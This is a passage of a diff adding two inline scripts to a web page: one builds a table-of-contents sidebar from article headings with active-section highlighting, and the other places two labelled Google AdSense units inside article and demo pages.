+          var article = document.querySelector('article');
+          if (!article) return;
+
+          // Collect anchor targets + labels.
+          // Support two patterns:
+          //   (a) <h2 id="..."> / <h3 id="..."> — explicit IDs on headings
+          //   (b) <section id="..."><h2>...</h2> — IDs on parent sections (older articles)
+          var entries = [];
+
+          // Pass (a): headings with own IDs
+          article.querySelectorAll('h2[id], h3[id]').forEach(function(h) {
+            entries.push({ id: h.id, text: h.textContent, level: h.tagName, el: h });
+          });
+
+          // Pass (b): sections with IDs whose h2 has no id yet
+          if (entries.length < 3) {
+            entries = [];
+            article.querySelectorAll('section[id]').forEach(function(sec) {
+              var h = sec.querySelector('h2, h3');
+              if (!h) return;
+              // Ensure heading has the id so IntersectionObserver works
+              if (!h.id) h.id = sec.id;
+              entries.push({ id: h.id, text: h.textContent, level: h.tagName, el: h });
+            });
+          }
+
+          if (entries.length < 3) return; // not worth showing
+
+          // Add has-toc-sidebar class to main
+          var mainEl = document.querySelector('main');
+          if (mainEl) mainEl.classList.add('has-toc-sidebar');
+
+          // Build sidebar element
+          var sidebar = document.createElement('nav');
+          sidebar.className = 'toc-sidebar';
+          sidebar.setAttribute('aria-label', 'Table of contents');
+
+          var header = document.createElement('div');
+          header.className = 'toc-sidebar-header';
+          header.textContent = 'In this article';
+          sidebar.appendChild(header);
+
+          var list = document.createElement('ul');
+          list.className = 'toc-sidebar-list';
+
+          entries.forEach(function(e) {
+            var li = document.createElement('li');
+            li.className = 'toc-sidebar-item' + (e.level === 'H3' ? ' toc-sidebar-item--sub' : '');
+            li.setAttribute('data-heading-id', e.id);
+
+            var a = document.createElement('a');
+            a.href = '#' + e.id;
+            a.textContent = e.text.replace(/^[0-9]+\.\s*/, ''); // strip leading "1. "
+            li.appendChild(a);
+            list.appendChild(li);
+          });
+
+          sidebar.appendChild(list);
+
+          // Append sidebar to main (grid places it to the right)
+          if (mainEl) mainEl.appendChild(sidebar);
+
+          // IntersectionObserver — highlight active heading
+          var items = sidebar.querySelectorAll('.toc-sidebar-item[data-heading-id]');
+          var activeId = null;
+
+          var observer = new IntersectionObserver(function(entries) {
+            entries.forEach(function(entry) {
+              if (entry.isIntersecting) {
+                activeId = entry.target.id;
+              }
+            });
+
+            items.forEach(function(item) {
+              item.classList.toggle(
+                'toc-sidebar-item--active',
+                item.getAttribute('data-heading-id') === activeId
+              );
+            });
+          }, {
+            rootMargin: '-20% 0px -75% 0px',
+            threshold: 0
+          });
+
+          entries.forEach(function(e) { observer.observe(e.el); });
+
+          // Smooth scroll for sidebar links
+          sidebar.addEventListener('click', function(e) {
+            var a = e.target.closest('a');
+            if (!a) return;
+            var id = a.getAttribute('href').replace('#', '');
+            var target = document.getElementById(id);
+            if (target) {
+              e.preventDefault();
+              target.scrollIntoView({ behavior: 'smooth', block: 'start' });
+              history.replaceState(null, '', '#' + id);
+            }
+          });
+        }
+
+        if (document.readyState === 'loading') {
+          document.addEventListener('DOMContentLoaded', buildSidebarToC);
+        } else {
+          buildSidebarToC();
+        }
+      })();
+    </script>
+
+    <!-- ME3: Inline ad injection — inserts 2 ads per article (post-intro + mid-article) -->
+    <script>
+      (function() {
+        var path = window.location.pathname;
+        var isArticle = (path.startsWith('/articles/') && path !== '/articles/') ||
+                        (path.startsWith('/demos/')    && path !== '/demos/');
+        if (!isArticle) return;
+
+        var pubId  = 'ca-pub-9373816755142401';
+        var slotId = '9879569728';
+        if (!pubId || !slotId) return;
+
+        function createAdUnit(label) {
+          var wrapper = document.createElement('div');
+          wrapper.className = 'ad-container ad-inline';
+          wrapper.setAttribute('data-ad-label', label);
+          wrapper.innerHTML =
+            '<ins class="adsbygoogle"' +
+            ' style="display:block"' +
+            ' data-ad-client="' + pubId + '"' +
+            ' data-ad-slot="' + slotId + '"' +
+            ' data-ad-format="auto"' +
+            ' data-full-width-responsive="true"></ins>';
+          return wrapper;
+        }
+
+        function injectAds() {
+          var article = document.querySelector('article');
+          if (!article) return;
+
+          var allP = article.querySelectorAll('p');
+          if (allP.length < 6) return;
+
+          // Ad 1: after paragraph 3 (post-intro)
+          var introTarget = allP[2];
+          if (introTarget && introTarget.parentNode) {
+            var ad1 = createAdUnit('post-intro');
+            introTarget.parentNode.insertBefore(ad1, introTarget.nextSibling);
+            try { (window.adsbygoogle = window.adsbygoogle || []).push({}); } catch(e) {}
+          }
+
+          // Re-query after first insertion, place mid-article ad
+          allP = article.querySelectorAll('p');
+          var midIdx = Math.floor(allP.length / 2);
+          if (midIdx < 6) midIdx = 6;
+          var midTarget = allP[midIdx];
+          if (midTarget && midTarget.parentNode) {
+            var ad2 = createAdUnit('mid-article');
+            midTarget.parentNode.insertBefore(ad2, midTarget.nextSibling);
+            try { (window.adsbygoogle = window.adsbygoogle || []).push({}); } catch(e) {}
+          }
+        }
+
+        if (document.readyState === 'loading') {
+          document.addEventListener('DOMContentLoaded', injectAds);
+        } else {
+          injectAds();
+        }
+      })();
+    </script>
+</body>
+</html>
